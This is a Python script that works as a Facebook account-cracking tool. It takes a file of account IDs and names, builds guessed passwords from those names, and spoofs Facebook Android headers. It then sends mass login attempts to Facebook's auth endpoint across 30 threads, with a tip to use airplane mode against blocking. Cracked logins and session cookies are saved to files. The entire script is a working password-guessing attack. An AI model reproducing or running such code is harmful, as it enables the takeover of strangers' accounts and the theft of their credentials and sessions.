import os,time,random,re,sys,string, subprocess
from concurrent.futures import ThreadPoolExecutor as tpe
os.system("pip uninstall requests -y;pip install requests")
try:
 import time,json,uuid,requests
except:
 os.system("pip uninstall requests -y;pip install requests")

idss = []
pp = []
oku = []
cpu = []
l = []
idx = []
loop = 0

def oo(t):
  return '\033[1;31m[\x1b[38;5;46m'+str(t)+'\033[1;31m]\x1b[38;5;46m '

W = '\x1b[1;97m'
G = '\x1b[1;92m'
R = '\x1b[1;91m'
S = '\x1b[1;96m'
B = '\x1b[1;94m'
Y = '\x1b[1;93m'
P = '\x1b[1;95m'

logo=(f"""\u001b[1;91m                                                            
                              \u001b[1;92m☯\u001b[1;91m
      
▄█    ▄▄▄▄▀ ██   ▄█▄     ▄  █ ▄█ 
██ ▀▀▀ █    █ █  █▀ ▀▄  █   █ ██ 
██     █    █▄▄█ █   ▀  ██▀▀█ ██ 
▐█    █     █  █ █▄  ▄▀ █   █ ▐█ 
 ▐   ▀         █ ▀███▀     █   ▐ 
              █           ▀      
             ▀                 \x1b[1;91m☯""")

def clear():
   os.system('clear')
   print(logo);lin3()

def lin3():
   print('\33[1;37m-------------------------------------------------')
def exit():
  sys.exit()

def main_menu():
    os.system("clear")
    print(logo);lin3()
    print(f"{oo(1)}File Cloning ")   
    print(f"{oo(0)}Exit")
    lin3()
    cp =input('\033[1;31m[\x1b[38;5;46m?\033[1;31m]\x1b[38;5;46m Choice :\033[1;31m ')
    if cp=="1":file()
    if cp == "0":
     exit()
    main_menu()
     
def file():
    os.system("clear")
    print(logo);lin3()
    file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found");time.sleep(1)
        main_menu() 
    method()
    exit()

def ua():
    fban = random.choice(["FB4A"])
    facebook_version = f"{random.randint(100, 450)}.0.0.{random.randint(1, 40)}.{random.randint(10, 150)}"
    fbbv = str(random.randint(10000000, 66666666))
    #av = str(random.randint(7, 11))
    density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
    width = random.choice(["720", "1080", "1280"])
    height = random.choice(["720", "1080", "1280", "1440", "1920"])
    fbcr = random.choice(['banglalink', 'DOCTYPE', 'MTN-CG', 'Cellcom', 'Salaam Telecom', 'BASE'])
    fblc = random.choice(["en_US", "en_US"])
    fbbd = 'samsung'
    fbpn = random.choice(["com.facebook.katana"])
    fbsv = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
    fbmf = 'samsung'
    fbdv = random.choice(["SM-G920F", "SM-T535", "SM-T231", "SM-J320F", "GT-I9190", "GT-N7100", "SM-T561", "GT-N7100", "GT-I9500", "SM-J320F", "SM-G930F", "SM-J320F", "SM-J510FN", "GT-P5100", "SM-J320F", "SM-T531", "SPH-L720", "GT-I9500", "SM-A015F", "SM-N975U1", "SM-A908N", "SM-A305G", "SM-J600G/DS", "SM-G770F/DS", "SM-J737PZ", "SM-A013G", "SM-M115F/DS", "SM-J810M", "SM-A217M/DS", "SM-G991U1", "SM-G715U", "SM-A715F/DS", "SM-J710F", "SM-A325F/DS", "SM-N975F/DS", "SM-J415FN/DS", "SM-G715FN/DS", "SM-A425F", "SM-J250G", "SM-N970U1", "SM-N986B/DS", "SM-N986U/DS", "SM-A9080", "SM-A027G/DS", "SM-A107M/DS", "SM-J737VPP", "SM-A217F/DS", "SM-J260M/DS", "SM-N986N/DS", "SM-A715F/DSN", "SM-A102U1", "SM-J701M/DS", "SM-A025M", "SM-A908B/DS", "SM-A102U", "SM-J320H", "SM-N970U", "SM-G996U1", "SM-G781U/DS", "SM-N975F/DSN", "SM-A908N/DS", "SM-A715GN/DS", "SM-A716B", "SM-A105F", "SM-A305G/DS", "SM-A715F/DSM", "SM-J250F/DS", "SM-G998U1", "SM-A115F", "SM-N986U1/DS", "SM-J810F/DS", "SM-A908N/DSM", "SM-J250M/DS", "SM-A705MN/DS", "SM-A022M", "SM-M317F/DS", "SM-N986U/DSN", "SM-A217U1", "SM-G996B/DS", "SM-G781V/DS", "SM-A9080/DS", "SM-G991B/DS", "SM-A107M/DSN", "SM-J737V/DS", "SM-A725F/DS", "SM-N975U", "SM-J701M/DSN", "SM-G715U1/DS", "SM-N970F/DSN", "SM-N975U1/DS", "SM-A908N/DSN", "SM-G996U/DS", "SM-A217M/DSN", "SM-N975F/DS", "SM-G715FN/DSN", "SM-J415F/DSN", "SM-N970U/DS", "SM-A725M/DS", "SM-N970U1/DSN", "SM-A425F/DSN", "SM-N986B/DSN", "SM-G991U/DS", "SM-J737P/DS", "SM-A908B/DSN", "SM-N986U/DSN", "SM-J415FN/DSN", "SM-A716B/DS", "SM-N970F/DS", "SM-A115M/DS", "SM-J810Y/DS", "SM-J320H/DS", "SM-G996U1/DS", "SM-N975U/DS", "SM-A908B/DS", "SM-A305G/DSN", "SM-A725F/DSN", "SM-G998N/DS", "SM-A115M/DSN", "SM-N986U1/DSN", "SM-J810F/DSN", "SM-A908N/DSN", "SM-J250M/DSN", "SM-A705MN/DSN", "SM-A022M/DS", "SM-M317F/DSN", "SM-N986U/DSN", "SM-A217U1/DS", "SM-G996B/DSN", "SM-G781V/DSN", "SM-A9080/DSN", "SM-G991B/DSN", "SM-A107M/DSN", "SM-J737V/DSN", "SM-A725F/DSN", "SM-N975U/DSN", "SM-J701M/DSN", "SM-G715U1/DSN", "SM-N970F/DSN", "SM-N975U1/DSN", "SM-A908N/DSN", "SM-G996U/DSN", "SM-A217M/DSN", "SM-N975F/DSN", "SM-G715FN/DSN", "SM-J415F/DSN", "SM-N970U/DSN", "SM-A725M/DSN", "SM-N970U1/DSN", "SM-A425F/DSN", "SM-N986B/DSN", "SM-G991U/DSN", "SM-J737P/DSN", "SM-A908B/DSN", "SM-N986U/DSN", "SM-J415FN/DSN", "SM-A716B/DSN", "SM-N970F/DSN", "SM-A115M/DSN", "SM-J810Y/DSN", "SM-J320H/DSN", "SM-G996U1/DSN", "SM-N975U/DSN", "SM-A908B/DSN", "SM-A305G/DSN", "SM-A725F/DSN", "SM-N975F/DSN", "SM-J810F/DSN", "SM-G715U1/DSN", "SM-A908N/DSN", "SM-N986U/DSN", "SM-J701M/DSN", "SM-A725F/DSN", "SM-N970F/DSN", "SM-A217M/DSN", "SM-G715FN/DSN", "SM-N970U/DSN", "SM-A425F/DSN", "SM-N986B/DSN", "SM-J737P/DSN", "SM-A908B/DSN", "SM-G991U/DSN", "SM-J415FN/DSN", "SM-A716B/DSN", "SM-N970F/DSN", "SM-A115M/DSN", "SM-J810Y/DSN", "SM-J320H/DSN", "SM-G996U1/DSN", "SM-N975U/DSN", "SM-A908B/DSN", "SM-A305G/DSN", "SM-A725F/DSN", "SM-G998U/DSN", "SM-A115F/DSN", "SM-N986U1/DSN", "SM-J810F/DSN", "SM-A908N/DSN", "SM-J250M/DSN", "SM-A705MN/DSN", "SM-A022M/DSN", "SM-M317F/DSN", "SM-N986U/DSN", "SM-A217U1/DSN", "SM-G996B/DSN", "SM-G781V/DSN", "SM-A9080/DSN", "SM-G991B/DSN", "SM-A107M/DSN", "SM-J737V/DSN", "SM-A725F/DSN", "SM-N975U/DSN", "SM-J701M/DSN"])
    
    return f"[FBAN/{fban};FBAV/{facebook_version};FBBV/{fbbv};FBDM/{{density={density},width={width},height={height}}};FBLC/{fblc};FBCR/{fbcr};FBMF/{fbmf};FBBD/{fbbd};FBPN/{fbpn};FBDV/{fbdv};FBSV/{fbsv};FBOP/1;FBCA/armeabi-v7a:armeabi;]"

def method():
    clear()
    
    lp = input(f'{oo("?")}Limit Passwords? :\x1b[38;5;46m ')
    if lp.isnumeric():
        pp=[]
        clear()
        ex = 'firstlast first123 last123'
        print(f'{oo("+")}{ex} (ETC)')
        lin3()
        for x in range(int(lp)):
           pp.append(input(f'{oo(x+1)}Password :\x1b[38;5;46m '))
    else:
       print(f"{oo('!')}Numeric Only");time.sleep(0.8)
       main_menu()
    clear() 
    print('\033[1;97m[+] Total Accounts : \033[1;32m '+str(len(idx)))
    print(f'\x1b[1;97m[✓] Use Airplane mOde ;)')
    lin3()
    def start(user):
     try:
        global loop,idx,cll
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(idx)) * 100)[:4]
        sys.stdout.write(f'\r {R}[{W}ITACHI{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}) {W}• {G}{len(oku)}\r')
        sys.stdout.flush()
        loop+=1
        for pswd in pp:
              heads= ua() 
              pswd = pswd.replace(f'first',first.lower()).replace(f'First',first).replace(f'last',last.lower()).replace(f'Last',last).replace(f'Name',name).replace(f'name',name.lower())
              header = {
    "Content-Type": "application/x-www-form-accencoded",
    "Host": "graph.facebook.com",
    "User-Agent": heads,
    "X-FB-Net-HNI": "25227",
    "X-FB-SIM-HNI": "29752",
    "X-FB-Connection-Type": "MOBILE.LTE",
    "X-Tigon-Is-Retry": "False",
    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
    "x-fb-device-group": "5120",
    "X-FB-Friendly-Name": "ViewerReactionsMutation",
    "X-FB-Request-Analytics-Tags": "graphservice",
    "Accept-Encoding": "gzip, deflate",
    "X-FB-HTTP-Engine": "Liger",
    "X-FB-Client-IP": "True",
    "X-FB-Server-Cluster": "True",
    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
    "Connection": "Keep-Alive",
              }

              data={
    "adid": str(uuid.uuid4()),
    "format": "json",
    "device_id": str(uuid.uuid4()),
    "cpl": "true",
    "family_device_id": str(uuid.uuid4()),
    "credentials_type": "device_based_login_password",
    "error_detail_type": "button_with_disabled",
    "source": "device_based_login",
    "email": acc,
    "password": pswd,
    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    "generate_session_cookies": "1",
    "meta_inf_fbmeta": "",
    "advertiser_id": str(uuid.uuid4()),
    "currently_logged_in_userid": "0",
    "locale": "en_US",
    "client_country_code": "US",
    "method": "auth.login",
    "fb_api_req_friendly_name": "authenticate",
    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
    "api_key": "882a8490361da98702bf97a021ddc14d",
              }
              response = r.post("https://b-graph.facebook.com/auth/login",data=data, headers=header, allow_redirects=False).json()
              if "session_key" in response:
                 oku.append(acc)
                 cookie=f"sb={''.join(random.choices(string.ascii_letters+string.digits+'_',k=24))};" +";".join(f"{i['name']}={i['value']}" for i in json.loads(response)["session_cookies"])
                 print('\x1b[38;5;46m[OKY] \x1b[38;5;46m'+acc+' \x1b[38;5;46m| \x1b[38;5;46m '+pswd)
                 print(ua())
                 #print(" [Cookie] ",cookie)
                 #print(ua())
                 open('/sdcard/NILL-Ok.txt','a').write(f'{acc}|{pswd}\n')
                 open('/sdcard/NILL-Ok-cookie.txt','a').write(f'{acc}|{pswd}|{cookie}\n')
                 break
              elif "User must verify their account" in response:
                cpu.append(acc)
                print('\x1b[38;5;208m[CP-] \x1b[38;5;208m'+acc+' \x1b[38;5;208m| \x1b[38;5;208m '+pswd)
                open('/sdcard/NILL-CP.txt','a').write(f'{acc}|{pswd}\n')
                break
              else:
                   continue   
     except Exception as e:
       time.sleep(10)
    with tpe(max_workers=30) as tp:
            tp.map(start,idx)
    exit()    


main_menu()